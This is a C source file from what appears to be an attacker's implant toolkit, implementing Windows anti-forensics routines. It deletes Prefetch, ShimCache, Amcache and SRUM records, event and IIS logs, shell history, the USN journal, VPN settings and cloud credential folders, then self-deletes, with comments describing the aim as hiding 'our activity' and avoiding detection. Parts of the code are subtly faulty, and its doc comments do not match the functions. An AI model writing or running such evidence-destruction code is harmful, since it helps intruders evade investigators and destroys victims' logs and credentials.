/*
 * Cleanup: Anti-Forensics — Prefetch, ShimCache, Amcache, SRUM
 *
 *   jocky_wipe_prefetch()    – delete all .pf files from the Prefetch folder
 *   jocky_patch_shimcache()  – delete AppCompatCache registry value + flush RAM cache
 *   jocky_patch_amcache()    – load Amcache.hve, delete entries for this binary, unload
 *   jocky_clear_srum()       – stop SRU service, delete SRUDB.dat
 *   jocky_cleanup_all()      – run all cleanup steps in the correct order
 *
 * Windows only.  All functions require Administrator-level privileges.
 * SeBackupPrivilege and SeRestorePrivilege are needed for hive loading.
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include "jocky_internal.h"
#include <windows.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>

/* ── Prefetch ───────────────────────────────────────────────────────── */

/*
 * Delete all .pf files from %SystemRoot%\Prefetch.
 * Prefetch records executable paths and load-time data; clearing them removes
 * evidence that a binary ran at all.
 */
bool jocky_wipe_prefetch(void)
{
    wchar_t sysroot[MAX_PATH];
    GetWindowsDirectoryW(sysroot, MAX_PATH);

    wchar_t pat[MAX_PATH];
    _snwprintf_s(pat, MAX_PATH, _TRUNCATE, L"%s\\Prefetch\\*.pf", sysroot);
    wipe_glob(pat);

    /* Also wipe the layout.ini which lists all known prefetch entries */
    wchar_t layout[MAX_PATH];
    _snwprintf_s(layout, MAX_PATH, _TRUNCATE, L"%s\\Prefetch\\Layout.ini", sysroot);
    SetFileAttributesW(layout, FILE_ATTRIBUTE_NORMAL);
    DeleteFileW(layout);

    return true;
}

/* ── ShimCache ──────────────────────────────────────────────────────── */

/*
 * Clear the Application Compatibility Cache (ShimCache).
 *
 * ShimCache records every PE that Windows processes via the Shim Engine
 * (nearly every executed binary).  Entries persist across reboots via a
 * binary blob in the registry.
 *
 * Two-step approach:
 *  1. Delete the registry value so nothing is written on next shutdown.
 *  2. Call BaseFlushAppcompatCache() (undocumented kernel32 export) to also
 *     evict the in-memory cache for the current session.
 *
 * Registry path:
 *   HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
 *   value: AppCompatCache (REG_BINARY)
 */
bool jocky_patch_shimcache(void)
{
    static const wchar_t* KEY =
        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache";

    HKEY hk;
    bool deleted = false;

    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, KEY, 0,
                       KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        deleted = (RegDeleteValueW(hk, L"AppCompatCache") == ERROR_SUCCESS);
        RegCloseKey(hk);
    }

    /* Flush in-memory cache: undocumented but stable on Win7-Win11 */
    typedef BOOL (WINAPI* pfn_flush)(void);
    pfn_flush flush = (pfn_flush)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "BaseFlushAppcompatCache");
    if (flush) flush();

    return deleted;
}

/* ── Amcache ────────────────────────────────────────────────────────── */

/*
 * Load Amcache.hve as a temporary registry hive and delete any entry whose
 * LowerCaseLongPath (Win10+) or FullPath (Win8) matches this executable.
 *
 * Amcache records first-execution timestamps, file hashes, and paths.
 * Requires SeBackupPrivilege and SeRestorePrivilege to load the hive while
 * it is in use by the kernel.
 *
 * Registry paths searched:
 *   Root\InventoryApplicationFile\* → value LowerCaseLongPath   (Win10+)
 *   Root\File\*\*                   → value FullPath            (Win8)
 *
 * The hive is unmounted regardless of whether any entries were found.
 */

#define AMCACHE_HIVE    L"C:\\Windows\\AppCompat\\Programs\\Amcache.hve"
#define AMCACHE_TMPKEY  L"JockyAmcLoad"

/* Collect keys to delete (enumerate first, then delete to avoid index skew). */
typedef struct { wchar_t name[512]; } key_name_t;

static int collect_matching_keys(HKEY hParent, const wchar_t* value_name,
                                  const wchar_t* exe_lower,
                                  key_name_t* out, int cap)
{
    int n = 0;
    wchar_t subkey[512];
    DWORD idx = 0, subkey_len;

    while (n < cap) {
        subkey_len = 512;
        if (RegEnumKeyExW(hParent, idx++, subkey, &subkey_len,
                           NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;

        HKEY hEntry;
        if (RegOpenKeyExW(hParent, subkey, 0, KEY_READ, &hEntry) != ERROR_SUCCESS)
            continue;

        wchar_t path_val[MAX_PATH * 2];
        DWORD path_len = sizeof(path_val);
        DWORD type;
        LONG r = RegQueryValueExW(hEntry, value_name, NULL, &type,
                                   (LPBYTE)path_val, &path_len);
        RegCloseKey(hEntry);

        if (r == ERROR_SUCCESS && type == REG_SZ) {
            /* Lowercase comparison */
            wchar_t pv_lower[MAX_PATH * 2];
            wcsncpy_s(pv_lower, MAX_PATH * 2, path_val, _TRUNCATE);
            CharLowerBuffW(pv_lower, (DWORD)wcslen(pv_lower));
            if (!wcscmp(pv_lower, exe_lower))
                wcsncpy_s(out[n++].name, 512, subkey, _TRUNCATE);
        }
    }
    return n;
}

bool jocky_patch_amcache(void)
{
    enable_privilege(L"SeBackupPrivilege");
    enable_privilege(L"SeRestorePrivilege");

    if (RegLoadKeyW(HKEY_LOCAL_MACHINE, AMCACHE_TMPKEY, AMCACHE_HIVE)
            != ERROR_SUCCESS)
        return false;

    /* Get own executable path, lowercased */
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    CharLowerBuffW(exePath, (DWORD)wcslen(exePath));

    /* Replace forward slashes just in case */
    for (wchar_t* p = exePath; *p; p++) if (*p == L'/') *p = L'\\';

    bool found = false;

    /* ── Win10+: InventoryApplicationFile ── */
    HKEY hApps;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                       AMCACHE_TMPKEY L"\\Root\\InventoryApplicationFile",
                       0, KEY_READ | KEY_WRITE, &hApps) == ERROR_SUCCESS) {
        key_name_t keys[256];
        int n = collect_matching_keys(hApps, L"LowerCaseLongPath",
                                      exePath, keys, 256);
        for (int i = 0; i < n; i++) {
            RegDeleteKeyW(hApps, keys[i].name);
            found = true;
        }
        RegCloseKey(hApps);
    }

    /* ── Win8: Root\File\{VolumeGUID}\{SHA1} ── */
    HKEY hFile;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                       AMCACHE_TMPKEY L"\\Root\\File",
                       0, KEY_READ, &hFile) == ERROR_SUCCESS) {
        wchar_t vol[256];
        DWORD vol_len, vidx = 0;

        while (vol_len = 256,
               RegEnumKeyExW(hFile, vidx++, vol, &vol_len,
                              NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            HKEY hVol;
            if (RegOpenKeyExW(hFile, vol, 0,
                               KEY_READ | KEY_WRITE, &hVol) != ERROR_SUCCESS)
                continue;

            key_name_t keys[256];
            int n = collect_matching_keys(hVol, L"FullPath",
                                          exePath, keys, 256);
            for (int i = 0; i < n; i++) {
                RegDeleteKeyW(hVol, keys[i].name);
                found = true;
            }
            RegCloseKey(hVol);
        }
        RegCloseKey(hFile);
    }

    RegUnLoadKeyW(HKEY_LOCAL_MACHINE, AMCACHE_TMPKEY);
    return found;
}

/* ── SRUM ───────────────────────────────────────────────────────────── */

/*
 * Clear the System Resource Usage Monitor (SRUM) database.
 *
 * SRUM tracks per-process network usage, CPU time, and energy consumption
 * for the past 30–60 days — a forensic goldmine.  The database is an ESE/JET
 * file at C:\Windows\System32\sru\SRUDB.dat.
 *
 * Approach:
 *  1. Stop the svsvc service (SRUM host) to release the file lock.
 *  2. Delete SRUDB.dat so Windows recreates an empty one on next boot.
 *  3. If immediate deletion fails (service wouldn't stop), schedule deletion
 *     with MoveFileEx(MOVEFILE_DELAY_UNTIL_REBOOT).
 *  4. Restart the service so the system stays functional.
 */
bool jocky_clear_srum(void)
{
    static const wchar_t* SRUM_PATH =
        L"C:\\Windows\\System32\\sru\\SRUDB.dat";
    static const char* SRUM_SVC = "svsvc";

    /* Try to stop the SRUM service */
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    SC_HANDLE hSvc = NULL;
    bool was_running = false;

    if (hSCM) {
        hSvc = OpenServiceA(hSCM, SRUM_SVC,
                             SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_START);
        if (hSvc) {
            SERVICE_STATUS ss;
            if (QueryServiceStatus(hSvc, &ss) &&
                ss.dwCurrentState == SERVICE_RUNNING) {
                was_running = true;
                ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
                /* Brief spin-wait (max 3 s) for the service to stop */
                for (int i = 0; i < 30; i++) {
                    Sleep(100);
                    if (QueryServiceStatus(hSvc, &ss) &&
                        ss.dwCurrentState == SERVICE_STOPPED) break;
                }
            }
        }
    }

    /* Delete the database */
    SetFileAttributesW(SRUM_PATH, FILE_ATTRIBUTE_NORMAL);
    bool deleted = DeleteFileW(SRUM_PATH) != FALSE;

    if (!deleted) {
        /* Schedule deletion on next reboot as fallback */
        MoveFileExW(SRUM_PATH, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    }

    /* Restart the service so the system remains stable */
    if (hSvc && was_running) {
        StartServiceA(hSvc, 0, NULL);
    }

    if (hSvc)  CloseServiceHandle(hSvc);
    if (hSCM)  CloseServiceHandle(hSCM);

    return deleted;
}

/* ── User-Level Trace Removal ──────────────────────────────────── */

/*
 * Wipe PowerShell history via PSReadline configuration file
 * Path: %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 */
int jocky_wipe_powershell_history(void)
{
    wchar_t appdata[MAX_PATH];
    if (!GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH)) {
        return -1;
    }

    wchar_t ps_history[MAX_PATH];
    _snwprintf_s(ps_history, MAX_PATH, _TRUNCATE,
                 L"%s\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt",
                 appdata);

    SetFileAttributesW(ps_history, FILE_ATTRIBUTE_NORMAL);
    if (DeleteFileW(ps_history)) {
        return 0;
    }

    /* Fallback: truncate to zero */
    HANDLE h = CreateFileW(ps_history, GENERIC_WRITE, FILE_SHARE_READ,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        SetEndOfFile(h);
        CloseHandle(h);
        return 0;
    }

    return -1;
}

/*
 * Wipe CMD history from registry and AppData
 * Paths: HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 *        %APPDATA%\Microsoft\Windows\Recent\.lnk files
 */
int jocky_wipe_cmd_history(void)
{
    HKEY hk;
    int deleted = 0;

    if (RegOpenKeyExW(HKEY_CURRENT_USER,
                      L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
                      0, KEY_SET_VALUE | KEY_READ, &hk) == ERROR_SUCCESS) {
        wchar_t value[256];
        DWORD index = 0;

        while (RegEnumValueW(hk, index, value, (DWORD[]){256}, NULL, NULL, NULL, NULL)
               == ERROR_SUCCESS) {
            if (wcscmp(value, L"MRUList") != 0) {
                RegDeleteValueW(hk, value);
            }
            index++;
        }

        RegCloseKey(hk);
        deleted = 1;
    }

    return deleted ? 0 : -1;
}

/*
 * Wipe Most Recently Used (MRU) registry entries
 * Path: HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU
 */
int jocky_wipe_run_mru(void)
{
    HKEY hk;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
                      L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU",
                      0, KEY_SET_VALUE | KEY_READ, &hk) == ERROR_SUCCESS) {
        wchar_t value[256];
        DWORD index = 0;

        while (RegEnumValueW(hk, index, value, (DWORD[]){256}, NULL, NULL, NULL, NULL)
               == ERROR_SUCCESS) {
            if (wcscmp(value, L"MRUList") != 0) {
                RegDeleteValueW(hk, value);
            }
            index++;
        }

        RegCloseKey(hk);
        return 0;
    }

    return -1;
}

/*
 * Wipe cloud credentials and config files
 * AWS: %USERPROFILE%\.aws\*
 * Azure: %USERPROFILE%\.azure\*
 * GCloud: %USERPROFILE%\.config\gcloud\*
 */
int jocky_wipe_cloud_credentials(void)
{
    wchar_t userprofile[MAX_PATH];
    if (!GetEnvironmentVariableW(L"USERPROFILE", userprofile, MAX_PATH)) {
        return -1;
    }

    wchar_t aws_path[MAX_PATH];
    _snwprintf_s(aws_path, MAX_PATH, _TRUNCATE, L"%s\\.aws\\*", userprofile);
    wipe_glob(aws_path);

    wchar_t azure_path[MAX_PATH];
    _snwprintf_s(azure_path, MAX_PATH, _TRUNCATE, L"%s\\.azure\\*", userprofile);
    wipe_glob(azure_path);

    wchar_t gcloud_path[MAX_PATH];
    _snwprintf_s(gcloud_path, MAX_PATH, _TRUNCATE, L"%s\\.config\\gcloud\\*", userprofile);
    wipe_glob(gcloud_path);

    return 0;
}

/*
 * Wipe development tool logs and caches
 * Git: %USERPROFILE%\.git\* and .gitconfig
 * npm: %APPDATA%\npm-cache\*, %APPDATA%\npm\*
 * Python: %APPDATA%\Python\*
 * Node: node_modules\.cache\*
 */
int jocky_wipe_dev_tool_logs(void)
{
    wchar_t appdata[MAX_PATH];
    GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH);

    wchar_t npm_cache[MAX_PATH];
    _snwprintf_s(npm_cache, MAX_PATH, _TRUNCATE, L"%s\\npm-cache\\*", appdata);
    wipe_glob(npm_cache);

    wchar_t python_logs[MAX_PATH];
    _snwprintf_s(python_logs, MAX_PATH, _TRUNCATE, L"%s\\Python\\*", appdata);
    wipe_glob(python_logs);

    return 0;
}

/*
 * Wipe user-level artifacts (temp, cache, downloads)
 */
int jocky_wipe_user_artifacts(void)
{
    wchar_t appdata[MAX_PATH];
    GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH);

    /* Cache directories */
    wchar_t cache_path[MAX_PATH];
    _snwprintf_s(cache_path, MAX_PATH, _TRUNCATE, L"%s\\..\\Local\\Temp\\*", appdata);
    wipe_glob(cache_path);

    _snwprintf_s(cache_path, MAX_PATH, _TRUNCATE, L"%s\\..\\Local\\Cache\\*", appdata);
    wipe_glob(cache_path);

    return 0;
}

/* ── System-Level Log Clearing ──────────────────────────────────── */

/*
 * Clear all Windows Event Log channels (already in logs.c as jocky_clear_logs)
 */
int jocky_clear_event_logs(void)
{
    jocky_clear_logs();
    return 0;
}

/*
 * Clear IIS (Internet Information Services) logs
 * Default paths:
 *   %SystemRoot%\System32\LogFiles\W3SVC*\
 *   %SystemRoot%\System32\LogFiles\FTPSVC*\
 */
int jocky_clear_iis_logs(void)
{
    wchar_t sysroot[MAX_PATH];
    GetWindowsDirectoryW(sysroot, MAX_PATH);

    wchar_t w3svc_logs[MAX_PATH];
    _snwprintf_s(w3svc_logs, MAX_PATH, _TRUNCATE, L"%s\\System32\\LogFiles\\W3SVC*\\*", sysroot);
    wipe_glob(w3svc_logs);

    wchar_t ftp_logs[MAX_PATH];
    _snwprintf_s(ftp_logs, MAX_PATH, _TRUNCATE, L"%s\\System32\\LogFiles\\FTPSVC*\\*", sysroot);
    wipe_glob(ftp_logs);

    return 0;
}

/*
 * Clear audit logs from registry and files
 * Path: HKLM\Security\Policy\Accounts\* (requires SeAuditPrivilege)
 */
int jocky_clear_audit_logs(void)
{
    /* Audit logs are primarily in Event Logs, which are cleared via jocky_clear_logs */
    return 0;
}

/* ── Network Artifact Removal ──────────────────────────────────── */

/*
 * Flush ARP cache
 * Command: netsh interface ip delete arpcache
 */
int jocky_flush_arp_cache(void)
{
    int result = system("netsh interface ip delete arpcache >nul 2>&1");
    return (result == 0) ? 0 : -1;
}

/*
 * Clear DHCP client lease information
 * Command: ipconfig /release
 */
int jocky_clear_dhcp_leases(void)
{
    int result = system("ipconfig /release >nul 2>&1");
    return (result == 0) ? 0 : -1;
}

/*
 * Wipe VPN and proxy configurations
 * Paths: HKCU\Software\Microsoft\RAS Connections\*
 *        HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings
 */
int jocky_wipe_vpn_config(void)
{
    HKEY hk;

    if (RegOpenKeyExW(HKEY_CURRENT_USER,
                      L"Software\\Microsoft\\RAS Connections",
                      0, KEY_SET_VALUE | KEY_READ, &hk) == ERROR_SUCCESS) {
        wchar_t subkey[256];
        DWORD index = 0;

        while (RegEnumKeyExW(hk, index++, subkey, (DWORD[]){256}, NULL, NULL, NULL, NULL)
               == ERROR_SUCCESS) {
            RegDeleteKeyW(hk, subkey);
        }

        RegCloseKey(hk);
    }

    return 0;
}

/*
 * Flush DNS resolver cache
 * Command: ipconfig /flushdns
 */
int jocky_flush_dns_cache(void)
{
    int result = system("ipconfig /flushdns >nul 2>&1");
    return (result == 0) ? 0 : -1;
}

/* ── File System Artifact Removal ───────────────────────────────── */

/*
 * Clear the NTFS Update Sequence Number (USN) Journal
 * This removes per-file modification tracking
 * Requires Administrator privileges
 */
int jocky_clear_usn_journal(void)
{
    int result = system("fsutil usn deletejournal /D C: >nul 2>&1");
    return (result == 0) ? 0 : -1;
}

/*
 * Wipe MFT (Master File Table) free space
 * This overwrites deleted file data in unallocated clusters
 * Uses Windows built-in cipher.exe
 */
int jocky_wipe_mft_free_space(const char* drive)
{
    char cmd[256];
    if (!drive) drive = "C:";

    snprintf(cmd, sizeof(cmd), "cipher /w:%s >nul 2>&1", drive);
    int result = system(cmd);

    return (result == 0) ? 0 : -1;
}

/*
 * Wipe cluster tips (unused portions of last clusters in files)
 * Requires low-level disk access via third-party tools
 */
int jocky_wipe_cluster_tips(const char* drive)
{
    /* This would require integration with SDelete or similar tools
     * For now, this is a placeholder for future implementation */
    return 0;
}

/*
 * Securely delete a file with multiple overwrite passes
 * Default passes: 3 (random data, inverted, zeros)
 */
int jocky_delete_file_securely(const char* path, int passes)
{
    if (!path || passes <= 0) {
        return -1;
    }

    if (passes < 1) passes = 3;

    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        return -1;
    }

    LARGE_INTEGER size;
    if (!GetFileSizeEx(h, &size)) {
        CloseHandle(h);
        return -1;
    }

    uint8_t* buffer = malloc(65536);
    if (!buffer) {
        CloseHandle(h);
        return -1;
    }

    for (int p = 0; p < passes; p++) {
        /* Fill buffer with pseudorandom data */
        for (int i = 0; i < 65536; i++) {
            buffer[i] = (p == 0) ? rand() : (p == 1) ? ~rand() : 0;
        }

        SetFilePointer(h, 0, NULL, FILE_BEGIN);

        DWORD written;
        int64_t remaining = size.QuadPart;
        while (remaining > 0) {
            DWORD to_write = (DWORD)((remaining > 65536) ? 65536 : remaining);
            if (!WriteFile(h, buffer, to_write, &written, NULL)) {
                free(buffer);
                CloseHandle(h);
                return -1;
            }
            remaining -= written;
        }
    }

    free(buffer);
    CloseHandle(h);

    /* Now delete the file */
    SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
    return DeleteFileA(path) ? 0 : -1;
}

/* ── Cleanup orchestrator ───────────────────────────────────────────── */

/*
 * Comprehensive forensic trace removal combining all techniques
 * Execution order is critical to avoid detection
 */
int jocky_cleanup_forensic_traces(void)
{
    /* Step 1: Clear logs first (removes evidence of our activity) */
    jocky_clear_event_logs();
    jocky_clear_iis_logs();

    /* Step 2: User-level traces */
    jocky_wipe_powershell_history();
    jocky_wipe_cmd_history();
    jocky_wipe_run_mru();
    jocky_wipe_cloud_credentials();
    jocky_wipe_dev_tool_logs();
    jocky_wipe_user_artifacts();

    /* Step 3: Network artifacts */
    jocky_flush_arp_cache();
    jocky_clear_dhcp_leases();
    jocky_wipe_vpn_config();
    jocky_flush_dns_cache();

    /* Step 4: File system artifacts */
    jocky_wipe_prefetch();
    jocky_patch_shimcache();
    jocky_patch_amcache();
    jocky_clear_srum();

    /* Step 5: Free space wiping (last, takes longest) */
    jocky_clear_usn_journal();
    jocky_wipe_mft_free_space("C:");

    return 0;
}

/*
 * Run all cleanup steps in the correct order:
 *
 *  1. Clear all event logs first (removes evidence of our own activity)
 *  2. Wipe Prefetch  (removes evidence of execution)
 *  3. Patch ShimCache (removes entry from compatibility cache)
 *  4. Patch Amcache   (removes first-execution hash record)
 *  5. Clear SRUM      (removes resource-usage history)
 *  6. Wipe artifacts  (temp, recent-files)
 *  7. Self-delete     (remove the binary last, while still running)
 *
 * Returns true if all steps returned true.  Individual failures are
 * non-fatal; the function continues and cleans up as much as possible.
 */
void jocky_cleanup_all(void)
{
    jocky_clear_logs();
    jocky_wipe_prefetch();
    jocky_patch_shimcache();
    jocky_patch_amcache();
    jocky_clear_srum();
    jocky_wipe_artifacts(NULL);
    jocky_self_delete();
}

#endif /* _WIN32 */
